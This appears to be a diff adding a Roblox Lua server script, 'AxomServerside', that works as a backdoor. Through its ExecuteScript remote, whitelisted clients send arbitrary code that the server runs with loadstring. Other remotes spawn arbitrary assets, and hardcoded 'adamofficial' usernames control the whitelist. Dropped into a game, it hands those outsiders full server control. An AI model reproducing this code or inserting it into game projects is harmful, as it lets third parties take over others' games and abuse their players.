@@ -1,0 +1,215 @@
+local Players = game:GetService("Players")
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
+local DataStoreService = game:GetService("DataStoreService")
+
+local AxomServerside = {}
+AxomServerside.Whitelist = {}
+AxomServerside.Config = {WhitelistSaveName = "AxomWhitelist"}
+
+local ADMIN_USERS = {
+    "adamofficial0022",
+    "adamofficial055", 
+    "adamofficial002",
+    "adamofficial022"
+}
+
+local Remotes = {
+    CheckWhitelist = Instance.new("RemoteEvent"),
+    RequestInterface = Instance.new("RemoteEvent"),
+    WhitelistUpdated = Instance.new("RemoteEvent"),
+    ExecuteScript = Instance.new("RemoteEvent"),
+    SpawnAsset = Instance.new("RemoteEvent"),
+    InsertTool = Instance.new("RemoteEvent"),
+    AdminCommand = Instance.new("RemoteEvent")
+}
+
+local AxomFolder = Instance.new("Folder")
+AxomFolder.Name = "AxomServerside"
+AxomFolder.Parent = ReplicatedStorage
+
+for name, remote in pairs(Remotes) do
+    remote.Name = name
+    remote.Parent = AxomFolder
+end
+
+local whitelistStore = DataStoreService:GetDataStore(AxomServerside.Config.WhitelistSaveName)
+
+local function saveWhitelist()
+    pcall(function()
+        whitelistStore:SetAsync("whitelist", AxomServerside.Whitelist)
+    end)
+end
+
+local function loadWhitelist()
+    local success, data = pcall(function()
+        return whitelistStore:GetAsync("whitelist")
+    end)
+    if success and data then
+        AxomServerside.Whitelist = data
+    end
+end
+
+loadWhitelist()
+
+function AxomServerside.isWhitelisted(player)
+    local userId = player.UserId
+    for _, id in ipairs(AxomServerside.Whitelist) do
+        if id == userId then
+            return true
+        end
+    end
+    return false
+end
+
+function AxomServerside.isAdmin(player)
+    for _, adminName in ipairs(ADMIN_USERS) do
+        if player.Name == adminName then
+            return true
+        end
+    end
+    return false
+end
+
+function AxomServerside.addToWhitelist(userId)
+    table.insert(AxomServerside.Whitelist, userId)
+    saveWhitelist()
+    for _, player in ipairs(Players:GetPlayers()) do
+        if player.UserId == userId then
+            Remotes.CheckWhitelist:FireClient(player, true)
+        end
+    end
+    Remotes.WhitelistUpdated:FireAllClients(AxomServerside.Whitelist)
+    return true
+end
+
+function AxomServerside.removeFromWhitelist(userId)
+    local newList = {}
+    for _, id in ipairs(AxomServerside.Whitelist) do
+        if id ~= userId then
+            table.insert(newList, id)
+        end
+    end
+    AxomServerside.Whitelist = newList
+    saveWhitelist()
+    for _, player in ipairs(Players:GetPlayers()) do
+        if player.UserId == userId then
+            Remotes.CheckWhitelist:FireClient(player, false)
+        end
+    end
+    Remotes.WhitelistUpdated:FireAllClients(AxomServerside.Whitelist)
+    return true
+end
+
+function AxomServerside.getUserFromInput(input)
+    local userId = tonumber(input)
+    if userId then
+        return userId
+    end
+    
+    for _, player in ipairs(Players:GetPlayers()) do
+        if player.Name:lower() == input:lower() then
+            return player.UserId
+        end
+    end
+    
+    return nil
+end
+
+Remotes.CheckWhitelist.OnServerEvent:Connect(function(player)
+    Remotes.CheckWhitelist:FireClient(player, AxomServerside.isWhitelisted(player))
+end)
+
+Remotes.RequestInterface.OnServerEvent:Connect(function(player)
+    if AxomServerside.isWhitelisted(player) then
+        Remotes.RequestInterface:FireClient(player, true)
+    else
+        Remotes.RequestInterface:FireClient(player, false)
+    end
+end)
+
+Remotes.ExecuteScript.OnServerEvent:Connect(function(player, scriptContent)
+    if not AxomServerside.isWhitelisted(player) then return end
+    
+    local success, err = pcall(function()
+        loadstring(scriptContent)()
+    end)
+    if not success then
+        warn("Script execution error from " .. player.Name .. ":", err)
+    end
+end)
+
+local function safeGetObjects(assetId)
+    local success, result = pcall(function()
+        return game:GetObjects("rbxassetid://" .. assetId)
+    end)
+    return success, result
+end
+
+Remotes.SpawnAsset.OnServerEvent:Connect(function(player, assetId, spawnType)
+    if not AxomServerside.isWhitelisted(player) then return end
+    
+    local success, objects = safeGetObjects(assetId)
+    if not success or #objects == 0 then return end
+    
+    local model = objects[1]:Clone()
+    
+    if spawnType == "tool" then
+        if player.Character then
+            local backpack = player:FindFirstChild("Backpack")
+            if backpack then
+                model.Parent = backpack
+            end
+        end
+    else
+        local offset = CFrame.new(0, 0, -5)
+        if player.Character and player.Character:FindFirstChild("HumanoidRootPart") then
+            model:PivotTo(player.Character.HumanoidRootPart.CFrame * offset)
+        end
+        model.Parent = workspace
+    end
+end)
+
+Remotes.InsertTool.OnServerEvent:Connect(function(player, assetId)
+    if not AxomServerside.isWhitelisted(player) then return end
+    
+    local success, objects = safeGetObjects(assetId)
+    if not success or #objects == 0 then return end
+    
+    local tool = objects[1]:Clone()
+    local backpack = player:FindFirstChild("Backpack")
+    if backpack then
+        tool.Parent = backpack
+    end
+end)
+
+Remotes.AdminCommand.OnServerEvent:Connect(function(player, command, target)
+    if not AxomServerside.isAdmin(player) then return end
+    
+    if command == "addwhitelist" then
+        local userId = AxomServerside.getUserFromInput(target)
+        if userId then
+            AxomServerside.addToWhitelist(userId)
+        end
+    elseif command == "removewhitelist" then
+        local userId = AxomServerside.getUserFromInput(target)
+        if userId then
+            AxomServerside.removeFromWhitelist(userId)
+        end
+    end
+end)
+
+Players.PlayerAdded:Connect(function(player)
+    task.wait(1)
+    Remotes.CheckWhitelist:FireClient(player, AxomServerside.isWhitelisted(player))
+    
+    if AxomServerside.isAdmin(player) then
+        Remotes.WhitelistUpdated:FireClient(player, AxomServerside.Whitelist)
+    end
+end)
+
+for _, player in ipairs(Players:GetPlayers()) do
+    Remotes.CheckWhitelist:FireClient(player, AxomServerside.isWhitelisted(player))
+    if AxomServerside.isAdmin(player) then
+        Remotes.WhitelistUpdated:FireClient(player, AxomServerside.Whitelist)
+    end
+end
